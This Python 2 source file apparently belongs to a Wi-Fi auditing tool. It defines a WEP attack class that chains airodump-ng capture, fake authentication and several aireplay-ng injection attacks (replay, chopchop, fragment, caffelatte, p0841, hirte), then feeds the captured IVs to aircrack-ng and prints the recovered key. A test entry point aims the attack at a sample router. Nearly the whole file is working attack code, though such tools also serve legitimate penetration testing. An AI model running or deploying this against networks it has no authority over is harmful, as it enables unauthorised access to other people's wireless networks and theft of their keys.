#!/usr/bin/python

from Attack import Attack
from Airodump import Airodump
from Aireplay import Aireplay, WEPAttackType
from Aircrack import Aircrack
from Configuration import Configuration
from Interface import Interface
from Color import Color
from CrackResultWEP import CrackResultWEP

import time

class AttackWEP(Attack):
    '''
        Contains logic for attacking a WEP-encrypted access point.
    '''

    fakeauth_wait = 5

    def __init__(self, target):
        super(AttackWEP, self).__init__(target)
        self.crack_result = None

    def run(self):
        '''
            Initiates full WEP attack.
            Including airodump-ng starting, cracking, etc.
        '''
        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      ivs_only=True, # Only capture IVs packets
                      output_file_prefix='wep') as airodump:

            airodump_target = self.wait_for_target(airodump)

            if self.fake_auth():
                # We successfully authenticated!
                # Use our interface's MAC address for the attacks.
                client_mac = Interface.get_mac()
            elif len(airodump_target.clients) == 0:
                # There are no associated clients. Warn user.
                Color.pl('{!} {O}there are no associated clients{W}')
                Color.pl('{!} {R}WARNING: {O}many attacks will not succeed' +
                         '  without fake-authentication or associated clients{W}')
                client_mac = None
            else:
                client_mac = airodump_target.clients[0].station

            aircrack = None # Aircrack process, not started yet

            wep_attack_types = [
                'replay',
                'chopchop',
                'fragment',
                'caffelatte',
                'p0841',
                'hirte'
            ]
            for attack_name in wep_attack_types:
                # Convert to WEPAttackType.
                wep_attack_type = WEPAttackType(attack_name)

                # Start Aireplay process.
                aireplay = Aireplay(self.target, \
                                    wep_attack_type, \
                                    client_mac=client_mac)

                time_unchanged_ivs = time.time() # Timestamp when IVs last changed
                previous_ivs = 0

                # Loop until attack completes.
                while True:
                    airodump_target = self.wait_for_target(airodump)
                    Color.p('\r{+} running {C}%s{W} WEP attack ({G}%d IVs{W}) '
                        % (attack_name, airodump_target.ivs))

                    # Check if we cracked it.
                    if aircrack and aircrack.is_cracked():
                        (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
                        bssid = airodump_target.bssid
                        if airodump_target.essid_known:
                            essid = airodump_target.essid
                        else:
                            essid = None
                        print '\n'
                        Color.pl('{+} {C}%s{W} WEP attack {G}successful{W}'
                            % attack_name)
                        print ''
                        if essid:
                            Color.pl('{+}     ESSID: {C}%s{W}' % essid)
                        Color.pl('{+}     BSSID: {C}%s{W}' % bssid)
                        Color.pl('{+}   Hex Key: {G}%s{W}' % hex_key)
                        if ascii_key:
                            Color.pl('{+} Ascii Key: {G}%s{W}' % ascii_key)
                        if aireplay:
                            aireplay.stop()
                        self.crack_result = CrackResultWEP(bssid, \
                                                           essid, \
                                                           hex_key, \
                                                           ascii_key)
                        return True

                    # Check number of IVs, crack if necessary
                    if airodump_target.ivs > Configuration.wep_crack_at_ivs:
                        if not aircrack:
                            # Aircrack hasn't started yet. Start it.
                            ivs_file = airodump.find_files(endswith='.ivs')[0]
                            Color.pl('\n{+} started {C}cracking{W}')
                            aircrack = Aircrack(ivs_file)

                        elif not aircrack.is_running():
                            # Aircrack stopped running.
                            Color.pl('\n{!} {O}aircrack stopped running!{W}')
                            ivs_file = airodump.find_files(endswith='.ivs')[0]
                            Color.pl('{+} {C}aircrack{W} stopped,' +
                                     ' restarting {C}aircrack{W}')
                            aircrack = Aircrack(ivs_file)

                        elif aircrack.is_running() and \
                             Configuration.wep_restart_aircrack > 0:
                            # Restart aircrack after X seconds
                            if aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                                aircrack.stop()
                                ivs_file = airodump.find_files(endswith='.ivs')[0]
                                Color.pl('{+} {C}aircrack{W} running more than' +
                                         ' {C}%d{W} seconds, restarting'
                                             % Configuration.wep_restart_aircrack)
                                aircrack = Aircrack(ivs_file)


                    if not aireplay.is_running():
                        # Some Aireplay attacks loop infinitely
                        if attack_name == 'chopchop' or attack_name == 'fragment':
                            # We expect these to stop once a .xor is created
                            #    or if the process failed.

                            # TODO: Check for .xor file.
                            # If .xor is not there, the process failed. Check stdout.
                            # XXX: For debugging
                            print '\n%s stopped, output:' % attack_name
                            print aireplay.get_output()
                            break

                            # If .xor exists, run packetforge-ng to create .cap
                            # If packetforge created the replay .cap file,
                            #   1. Change attack_name to 'forged arp replay'
                            #   2. Start Aireplay to replay the .cap file
                        else:
                            Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
                            print '\naireplay.get_output():'
                            print aireplay.get_output()
                            break

                    # Check if IVS stopped flowing (same for > N seconds)
                    if airodump_target.ivs > previous_ivs:
                        time_unchanged_ivs = time.time()
                    elif Configuration.wep_restart_stale_ivs > 0:
                        stale_seconds = time.time() - time_unchanged_ivs
                        if stale_seconds > Configuration.wep_restart_stale_ivs:
                            # No new IVs within threshold, restart aireplay
                            aireplay.stop()
                            Color.pl('{!} restarting {C}aireplay{W} after' +
                                     ' {C}%d{W} seconds of no new IVs'
                                         % stale_seconds)
                            aireplay = Aireplay(self.target, \
                                                wep_attack_type, \
                                                client_mac=client_mac)
                    previous_ivs = airodump_target.ivs

                    time.sleep(1)
                    continue


    def fake_auth(self):
        '''
            Attempts to fake-authenticate with target.
            Returns: True if successful,
                     False is unsuccesful.
        '''
        Color.p('{+} attempting {G}fake-authentication{W} with {C}%s{W}...'
            % self.target.bssid)
        start_time = time.time()
        aireplay = Aireplay(self.target, 'fakeauth')
        process_failed = False
        while aireplay.is_running():
            if int(time.time() - start_time) > AttackWEP.fakeauth_wait:
                aireplay.stop()
                process_failed = True
                break
            time.sleep(0.1)

        # Check if fake-auth was successful
        if process_failed:
            fakeauth = False
        else:
            output = aireplay.get_output()
            fakeauth = 'association successful' in output.lower()

        if fakeauth:
            Color.pl(' {G}success{W}')
        else:
            Color.pl(' {R}failed{W}')
            if Configuration.require_fakeauth:
                # Fakeauth is requried, fail
                raise Exception(
                    'Fake-authenticate did not complete within' +
                    ' %d seconds' % AttackWEP.fakeauth_wait)
            else:
                # Warn that fakeauth failed
                Color.pl('{!} {O}' +
                    'unable to fake-authenticate with target' +
                    ' (%s){W}' % self.target.bssid)
                Color.pl('{!} continuing attacks because' +
                    ' {G}--require-fakeauth{W} was not set')
        return fakeauth



if __name__ == '__main__':
    from Target import Target
    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
    target = Target(fields)
    wep = AttackWEP(target)
    wep.run()

